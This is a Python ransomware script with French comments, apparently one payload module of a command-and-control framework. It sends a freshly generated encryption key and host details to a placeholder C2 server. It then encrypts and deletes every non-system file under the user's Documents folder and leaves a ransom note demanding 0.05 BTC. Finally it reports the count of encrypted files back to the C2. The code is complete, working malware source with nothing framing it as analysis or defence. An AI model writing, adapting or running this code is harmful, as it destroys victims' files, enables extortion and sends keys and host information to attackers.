#!/usr/bin/env python3
"""
payloads/ransomware.py — chiffreur AES-256 (Fernet)
Chiffre récursivement TARGET_DIR, dépose une note de rançon.
La clé est envoyée au C2 avant chiffrement.
Dépendance : cryptography (pip install cryptography)
Variables injectées : FILL_C2_HOST, FILL_PORT
"""
import os, json, socket, platform, urllib.request, datetime
from pathlib import Path
from cryptography.fernet import Fernet

C2         = "http://FILL_C2_HOST:FILL_PORT"
BOT_ID     = socket.gethostname()
TARGET_DIR = str(Path.home() / "Documents")   # adapter selon la cible
EXT_LOCK   = ".fl_locked"
NOTE_NAME  = "LIRE_MOI_FLASH.txt"
SKIP_EXT   = {".py", ".exe", ".dll", ".sys", ".bat", ".cmd",
              ".lnk", EXT_LOCK}
SKIP_DIRS  = {"Windows", "Program Files", "Program Files (x86)",
              "AppData\\Local\\Temp"}

RANSOM_NOTE = """
╔══════════════════════════════════════════╗
║        VOS FICHIERS ONT ÉTÉ CHIFFRÉS    ║
╠══════════════════════════════════════════╣
║                                          ║
║  Tous vos fichiers ont été chiffrés      ║
║  avec un algorithme AES-256 militaire.   ║
║                                          ║
║  Pour récupérer vos fichiers :           ║
║  1. Envoyez 0.05 BTC à :                 ║
║     FILL_WALLET_ADDRESS                  ║
║                                          ║
║  2. Envoyez votre ID à :                 ║
║     FILL_CONTACT_EMAIL                   ║
║                                          ║
║  Votre ID : {bot_id}
║  Date     : {date}
║                                          ║
║  Ne tentez PAS de déchiffrer sans nous.  ║
╚══════════════════════════════════════════╝
"""

def _post(url, data):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

# Génération clé + envoi C2 avant chiffrement
KEY    = Fernet.generate_key()
FERNET = Fernet(KEY)

_post(f"{C2}/c2/result/{BOT_ID}", {
    "result": f"[RANSOM_KEY] {KEY.decode()} | target={TARGET_DIR} | "
              f"host={BOT_ID} | os={platform.platform()}"
})

encrypted_count = 0
error_count     = 0

for root, dirs, files in os.walk(TARGET_DIR):
    # Skip dossiers système
    dirs[:] = [d for d in dirs
               if not any(s in d for s in SKIP_DIRS)]
    for fname in files:
        p = Path(root) / fname
        if p.suffix.lower() in SKIP_EXT:
            continue
        if EXT_LOCK in fname:
            continue
        try:
            data    = p.read_bytes()
            enc     = FERNET.encrypt(data)
            locked  = p.with_suffix(p.suffix + EXT_LOCK)
            locked.write_bytes(enc)
            p.unlink()
            encrypted_count += 1
        except Exception:
            error_count += 1

# Note de rançon dans chaque dossier visité + bureau + racine target
note_dirs = {
    TARGET_DIR,
    str(Path.home() / "Desktop"),
    str(Path.home()),
}
note_text = RANSOM_NOTE.format(
    bot_id=BOT_ID,
    date=datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
)
for d in note_dirs:
    try:
        (Path(d) / NOTE_NAME).write_text(note_text)
    except Exception:
        pass

_post(f"{C2}/c2/result/{BOT_ID}", {
    "result": (f"[RANSOM_DONE] encrypted={encrypted_count} "
               f"errors={error_count} target={TARGET_DIR}")
})